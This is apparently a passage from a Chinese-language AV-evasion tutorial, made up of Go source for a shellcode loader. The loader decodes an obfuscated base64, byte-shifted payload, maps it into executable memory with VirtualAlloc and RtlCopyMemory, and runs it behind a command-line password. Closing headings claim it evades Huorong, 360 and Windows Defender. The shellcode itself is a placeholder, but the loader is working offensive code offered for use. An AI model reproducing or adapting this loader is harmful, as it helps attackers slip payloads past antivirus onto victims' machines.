        "os"
        "strconv"
        "strings"
        "syscall"
        "unsafe"
    )
    const (
        MEM_COMMIT             = 0x1000
        MEM_RESERVE            = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40 // 区域可以执行代码，应用程序可以读写该区域。
        KEY_1                  = 55
        KEY_2                  = 66
    )
    var (
        kernel32      = syscall.MustLoadDLL("kernel32.dll")   // kernel32.dll它控制着系统的内存管理、数据的输入输出操作和中断处理
        ntdll         = syscall.MustLoadDLL("ntdll.dll")      // ntdll.dll描述了windows本地NTAPI的接口
        VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") // VirtualAlloc申请内存空间
        RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   // RtlCopyMemory非重叠内存区域的复制
    )
    func condition() {
        var a string
        for i := 1; i < len(os.Args); i++ {
            a += os.Args[i]
        }
        b := "qaxnb"
        if a == b {
            build()
        }
    }
    func build() {
        xor_shellcode := " py脚本处理后的shellcode "
        var payload_byte []byte
        shellcode_byte, _ := base64.StdEncoding.DecodeString(xor_shellcode[2:]) // 除混淆字符外base64解码
        payload := string(shellcode_byte)                                       // []byte切片转string
        payloadb := strings.Split(payload, "\\x")[1:]                           // 以\x将字符串分割成切片
        for i := 0; i < len(payloadb); i++ { // 遍历转16进制
            tmp_byte, err1 := strconv.ParseInt(payloadb[i], 16, 32) // 取切片中的字符转16进制
            if err1 != nil {
                fmt.Println(err1.Error())
            }
            payload_byte = append(payload_byte, uint8(tmp_byte)) // 加到payload_byte切片中
        }
        var shellcode []byte
        for i := 0; i < len(payload_byte); i++ {
            if payload_byte[i] == 255 {
                shellcode = append(shellcode, payload_byte[i])
            } else {
                shellcode = append(shellcode, payload_byte[i]-1) // 递归shellcode-1还原
            }
        }
        addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) // 为shellcode申请内存空间
        if err != nil && err.Error() != "The operation completed successfully." {
            fmt.Println("error------------------------------")
            fmt.Println(err.Error())
        }
        _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode))) // 将shellcode内存复制到申请出来的内存空间中
        if err != nil && err.Error() != "The operation completed successfully." {
            fmt.Println(err.Error())
        }
        syscall.Syscall(addr, 0, 0, 0, 0)
    }
    func main() { // 生成的shellcode值+1并base64编码再在前面加2位混淆字符
        func(data string) {
            condition()
        }("world!")
    }
    // uintptr一个足够大的无符号整型， 用来表示任意地址。
    // MEM_COMMIT标志将在页面大小边界上提交页面,而使用MEM_RESERVE或MEM_RESERVE | MEM_COMMIT将在大于页面大小的边界上保留或保留提交页面。
## 免杀效果
### 火绒免杀
### 360免杀
### Defender稳定免杀